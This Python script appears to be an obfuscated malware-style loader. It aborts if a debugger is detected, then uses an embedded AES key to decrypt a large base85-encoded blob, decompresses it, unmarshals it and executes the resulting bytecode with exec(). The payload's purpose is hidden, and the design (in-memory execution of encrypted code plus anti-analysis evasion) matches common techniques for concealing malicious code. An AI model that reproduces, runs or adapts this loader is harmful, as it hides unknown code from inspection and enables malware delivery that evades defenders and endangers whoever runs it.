
import sys
import os
import base64
import hashlib
import marshal
import zlib
import traceback
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

def _anti_debug():
    if sys.gettrace() or (os.name == 'nt' and __import__('ctypes').windll.kernel32.IsDebuggerPresent()):
        sys.exit(1)
_anti_debug()

_KEY = b'\xba~b<\xc7\x88\xfb\x99\xce}\xa0=\x88\x13\xd3^\x07\xeb<\xd8\xb3\x0b\x82\x884\xf6\xd7\x04\xb3\xcb0\xca'
_IV = b'\x999\xb0~\xd6\x15\xa3\x8c\xdd-@-\x8b\xf9\x8e2'

def _decrypt_str(data):
    try:
        cipher = AES.new(_KEY, AES.MODE_CBC, _IV)
        return unpad(cipher.decrypt(data), 16).decode()
    except:
        return ""

def _main():
    try:
        _encrypted = 'JXUD&^M`ZI(}b^Jd`m5FY{o2h#EGbGN8_{~Jiepx8_#=@VxBd)1In$UNM_^AtufbV-7qeA{{NeVw#<+jDCWI-|0I2q1^au+5-~G6ou2N6p){UZa>bBm;g6w?@>>8C2al0j4*QY!J3q%j&bGj=N=26CWHdNNreCxSuww?n@qIzBDw@38gBTt^C%oX-21HpH`@>u&PK`}9;uVeuD?(RUne{^f^sD{DY=t%Q>nYOn3#=ZE8flBMVp_+hsFTqXS8*S(-SrvH;W$v}!r(z>!a-~aG9(4mOYsmh@HB1mO=ZC)g-?iVbq#a8$lOp{J1AxC%D{*IK4b{hbSa>q<*G}Oi_vGV5v^&}>W<&d-!<0Y*6{frWO9>L{Pq{a>3oh&<CEOd(iJvJz!%zut8pC;#cwk03-TLKFL?<27h(kJ;Zt>j6RO`TqPH$m!LcYp@_7s+aTuVtlFhGm3(VQtm5;3P<l4n}!nQ80>l@IQxkW61Zn%?NoKP1)()*BWLcEmaiENLB*|@tr@Bevf6Ezw%qw6`0f7ZY(He7Oop_N$f#Haop#|JQLtkUWdm8EXAY+6$~fMT7LO{DIlQZhiuO1QNH<FYC@$=S}#equb3@da2l_V&l>3G7T7UjbFBQE~8sW)JE_^ZJM>t+81z$}N7{){(Cr&#>eGePB5eIa0!!O&y=JQ|acSiIi3&>u@^L?1Tsqc2$AIiU%Wh;rLXJ>aTvD@%0`|*w<Aoc(b!xn6y2D{YaleHNq<vfw3HmS5b@&B8rBo7WN(}vhd#s_)g@l^&_ays#fcWld37HLQHc_hymJ9iX<OBZIK63{$`@dK5?x1P5OG|WXX|HP7&LON7d*TvX7&4YD)Y<M72aVA||CuvY+awAt%O@LtOem76vsReEOsGcnzXK@&m}O%=N1!itz^-uCC5}e@dE7CMmm6i$%OYEKUhH;7~Z=Iv@x`P7$A2dcu3zmv`Q{ZF=?$;o6n{R${;+uH9^MR9)N=O_%RE%c8Das2g4&<m>|RQZDR#*X)|iY5j5UNn0UOcx3mC->px6XGD{~Nz;}bH<l$~(ZV)#3DC1&G+=`4rk6{nrFK4ITHfO58foqb7M4h`*@NbE@@6yCDIX~2I)1Ds37^Y@lN^Z1T9K77nCU14|6)?5<p)DAa&%2NUCzOV{NE_T$XmlsO@{TR>qf8C_C3fvNt9{W_Yv1h<ncP$9(a7PwYyoYrJKX@iLoxV&)1V)!i5D5#Xrl2hX>ze)`_@xx0CQ?E}x?2(7@WaOb(Erbgiv;B@P$9BTN7h9aKG)T~BrT_0r2eogi1qCW4q$7b$kRWi~#+(jC=7Cjq4Z^!1zF$rQPqWnb6_T~KyrU@N5yi-@*#uI)MCzanoa<<T!(Jl*A%3qF=u2VObxtd3cdKM;`i+*wHGDmC<vN(V*Rl2j<d@TJa@O$I%iqeY&67oKOv2BG5!yyTF@Lr#sc(*9961DDRc8gmPi<vedkyb}I0U<ByQdaAZ~sLVr|xyCQ^+Hbh|BKZ7xKJ3*)-CWi$*Tfa8zn;g5GZVsqNqKWV7NME6D}!9pp<EzDjJ?<$B;3Q)G@nhYVlSNSZ%PoGiLo>2bC~kNn>|Fox^%=AgnsE8jR@&(jcj`2tqji2{SyF@oEHKAmjS--(f-;Yn|o^RGKvurl<K?IrJs?TP3C?*wSe2@5QJ^-$bAz4a<(nmaR3Rek56s%l=cqw{;vDDi%=w_z&JybqJbZ0Z>lMj`V9TKTI9^%d7FbfIuu72Ug+n)EgA)bMgV_aA<@m}y)METEH!4jeqd9#AhX;zSLB|{)y(swm8>4OqG`a)0ge7$gg;j#_Om;X`-4-4C9``^tithvP2HilNeP-FraeOp9!h|&S5+(Z)H|gTTank+=1K$@lMfE?uKgjXzp^rI(m0h2_B%9Qm3$ZzmKTq=?Gy{P6nbSgd9blAIr$<ybC6uoi{DFnd6@2Li6}_R2vaSRYGK@QxmivfP7Lo4932?SyXUt$Q=tG(X*6rrdM1^j_nS$v2}E32%dK(quB&5$jee2OFUf#46tPH%5^ie>aXYrt$rX+Bop#cFlgqX(M>5EHM8;dgqvW9s=T^7e{jJhkNYc?ir-;*GJ%5yLU{8g?w&GvGnJM6qaL8vr%s~v(3#^{{XMza>8eQVw6cEMLg(?j8TJHc;2grYQI(x&bw;uvyf*1H0ENgvFAHouXNDsOI$Kr*#HI$vohaL^bsrBMrTt>$(5oB&tiz90I0?btf2?xl@@}V{E*PYa_9WNm73B8f#Z>!7GN4F~3DYigSq(VBP%coUOO6Qj^LUSC)t@GR%+xIdcKH!-R^Y4`)`Tav`klm6uDG5C_#aN9r7ogof_b5c~x9mZ#9wlQU7(q@Ao9t8i=M<KG23JTBwXg}l;XZ6samQ#TunTzqQ5?Nja9Oa}xa8VAAiC?10&`m-{5Gsm<OeXnAX@N88O!l|0)(mgj=CcY`~J`*beY}F9=s&q`{(xcW!NONPxyt0PeCX(EF3X-4W{SAY%7Wdtk75g@lZ_6eZ&H4XNU!$?mnd20pL_8Xti%rn$6(xME>N1i7)nV0^%Z&CH;z$ch;hepb7D!QaBVU<Q&itZv4<@#mLE{S%ze!Q6mG{Ws8tAnC5!K*!t%>gUlGZviJ1+04ueXnSPR~T2JY<4hvH_fX&ixnK#nK6yAmYlCl+e8XTgQltL}?Cq#Ht37(mtzq08?Be|1@GwXwo`m&Y2l1g?E>43godvQVy_+Y6ys`AR|h5!a`u*}H@WVAlqDLrdAd7=%fhIO<Dx;6d=TIX0>f=4<^8(8%p7z-sJ(lobW+Pl#$S!snaCIEtIB?W}|Z<Oa~zQK1!TmEgG`83oZU$Z<0ivLWBx!%!XYIxc}aC8tWMri++mn2>*U_?y|y9Un-Lwr~&+fVc}Rh7b7CT@vfRs$i7DSIb?#_?%-{9L*W=$&q3a%BWw$+d~WCQVcSch-@jET&F?Nb$tn(1WP9XF6h&EF*8k`OUXtBz?PVv&Zk%bQ?5m5SEDUln68|KgOsQsM=P0b(AKHdf-ky(W;T3z`oTzBOW7M8+g<G_QrT*k2T0Gg?HlAIBd{LX|-Wn45KX#$6}0=83O}Dt$o%D<+k*Tg=TXo#-e$A&9dkW&Pg{Y-hm!tYsza%m0E0$JAGMQBWQqX*Ifw}+fUK-tpReeW+CK6d=tg$7WblHxFKc+_W+$DmD}_HXC*lxYk-+p)KAibNk1yYgBBGxM0zxYpfe<=hu|<9?9Ck&Ss)trqw4ugcw<#kSpFo%*VXoVWWT6>7nzBoZvBT8vVKT&k?bJ%8;>QQ+rx3Ao1;1%Rp1I6U27MbAskvnYRT7^$XpmRX4GDE1^#ci1G@b4ClayYJm3sUN}FEik*xcfZ-m!IQ1df9GAs5<>iv?E6MafhuCQr1i(ZDM#95fk#I{UjO4jeIM@!XoFu=liv~9bQmb-0BfpN<wj6gFCXGrs&%H-bXi2r5OMR;ud#^gs0^n{1NQLw)#r8HJ2ck$**VQcMcDIQgxd5xWhB&6Hz^~tP>{&h(|ixJ7W5A;LX);QD-LkZ}q#M85_vXg{U@%Wv}ePGr=oY}R?St3)D*}t{}WfnPJ@GzRz%R_juE${S*Ca5CP#vRyCz!Quh#PF+)LzMT&Zr(I`?iy%u9K_((fc&U6jmS@0d(p(8+Pld3<Y0)?hhDjvc9ee*sW!v^_(BYZUzB)S+OA65c9?OwM6cV%O2<$q=}<F}_Np~qMTRIAC(>8Xa!E~3?4U0{ylv@3egJG|klylropr*qO_iJRW!hezA@pkpZQ()dRJiMfgZBZY7(Rvti^BGCF;kYeL5Ou6FAI*FqYpo7wM0x`!jZa&H1HCUQebI`ysf9{1NIKLl!`h>$iE>jFm3RuAERD#d^l59N#26e@feyVUZY#ZYmQ(%e>em2+-u2H-cC@?x{X})qYOa_;L+5<pEY$zpI6cK_^oC>)hZf=Bz_|9@o?nJgOwl~&?1;$Vb8RIG6xkUu^<^5TRf?P7htOCUg~uC4OG(-JvXL!z+D_{%0@PSE07AFeSJdzzvy6Ctu@5`DZO;JTgVC-iz@2)Q#fzOqxHH^pipj@&rV#(7`voS8<i=j5wvNUnXi9?Pm?){%)B-Y#Ic5)&Q*iunruk3ZMYn?'
        
        
        cipher = AES.new(_KEY, AES.MODE_CBC, _IV)
        encrypted_data = base64.b85decode(_encrypted)
        decrypted_data = unpad(cipher.decrypt(encrypted_data), 16)
        decompressed_data = zlib.decompress(decrypted_data)
        
        exec(marshal.loads(decompressed_data), {
            **globals(),
            '__name__': '__main__',
            '__builtins__': __builtins__,
            '_decrypt_str': _decrypt_str
        })
    except Exception as e:
        print("Execution failed:")
        traceback.print_exc()
        sys.exit(1)

if __name__ == '__main__':
    _main()
        
